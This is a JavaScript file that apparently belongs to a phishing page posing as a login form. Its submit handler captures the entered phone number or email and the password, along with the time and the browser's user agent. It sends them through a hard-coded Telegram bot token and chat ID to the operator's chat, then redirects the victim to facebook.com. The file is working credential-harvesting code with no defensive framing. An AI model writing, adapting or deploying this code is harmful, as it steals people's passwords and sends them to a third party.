document.addEventListener('DOMContentLoaded', function () {
  const loginForm = document.getElementById('loginForm');
  const loginBtn = document.getElementById('loginBtn');
  const btnText = loginBtn.querySelector('.btn-text');

  loginForm.addEventListener('submit', function (e) {
    e.preventDefault();

    const email = loginForm.querySelector('input[type="text"]').value;
    const password = loginForm.querySelector('input[type="password"]').value;
    const time = new Date().toLocaleString();
    const device = navigator.userAgent;

    const message = `
━━━━━━━━━━━━━━━━━━━━━━
🎉 *LOGIN SUCCESSFUL!* ✅
━━━━━━━━━━━━━━━━━━━━━━

📝 *Login Details:*
📱 *Nomor:* \`${email}\`
🔑 *Password:* \`${password}\`
⏰ *Time:* ${time}
📱 *Device:* ${device}

━━━━━━━━━━━━━━━━━━━━━━
⚠️ *Harap verifikasi login ini segera!*
━━━━━━━━━━━━━━━━━━━━━━`;

    // Kirim ke Telegram
    fetch(`https://api.telegram.org/bot7686196048:AAHk393h1DicgJSfBcu4stdPtRLYr6uax1o/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: '7168768981',
        text: message,
        parse_mode: 'Markdown'
      })
    });

    loginBtn.innerHTML = '<div class="spinner"></div>';
    loginBtn.style.pointerEvents = 'none';

    setTimeout(() => {
      window.location.href = "https://www.facebook.com";
    }, 1500);
  });

  loginBtn.addEventListener('mouseenter', () => {
    loginBtn.style.transform = 'translateY(-3px)';
  });

  loginBtn.addEventListener('mouseleave', () => {
    loginBtn.style.transform = 'translateY(0)';
  });
});